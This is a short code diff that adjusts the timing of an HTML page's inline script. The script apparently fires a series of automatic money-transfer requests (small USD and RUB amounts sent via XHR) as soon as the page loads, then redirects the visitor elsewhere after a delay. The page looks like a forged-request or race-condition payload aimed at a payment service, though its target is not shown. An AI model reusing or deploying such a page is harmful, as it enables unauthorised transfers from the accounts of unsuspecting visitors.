@@ -40,16 +40,15 @@ xhr.onload = function() {
     encodeURIComponent(pcAmount);
 xhr.send(body);
 }
- setTimeout(sendTransfer(1, "USD", 1.01), 100);
- setTimeout(sendTransfer(5, "RUB", 5.05), 1000);
- setTimeout(sendTransfer(2, "USD", 2.02), 1000);
- setTimeout(sendTransfer(2, "USD", 2.02), 1000);
- setTimeout(sendTransfer(5, "USD", 5.05), 1000);
- setTimeout(sendTransfer(10, "USD", 10.10), 1000);
-  setTimeout(sendTransfer(10, "RUB", 10.10), 1000);
-   setTimeout(sendTransfer(5, "RUB", 5.05), 1000);
-  	 setTimeout(sendTransfer(1, "RUB", 1.01), 1000);
- setTimeout(sendTransfer(2, "RUB", 2.02), 1000);
+ setTimeout(sendTransfer(1, "USD", 1.01), 10);
+ setTimeout(sendTransfer(5, "RUB", 5.05), 1500);
+ setTimeout(sendTransfer(2, "USD", 2.02), 1500);
+ setTimeout(sendTransfer(5, "USD", 5.05), 1500);
+ setTimeout(sendTransfer(10, "USD", 10.10), 1500);
+  setTimeout(sendTransfer(10, "RUB", 10.10), 1500);
+   setTimeout(sendTransfer(5, "RUB", 5.05), 1500);
+  	 setTimeout(sendTransfer(1, "RUB", 1.01), 1500);
+ setTimeout(sendTransfer(2, "RUB", 2.02), 1500);
 </script>
 
 <script>
@@ -57,7 +56,7 @@ xhr.send(body);
   const container = document.getElementById("iframes-container");
 setTimeout(() => {
     window.location.href = src;
-  }, 9000);
+  }, 15000);
 </script> 
 
 
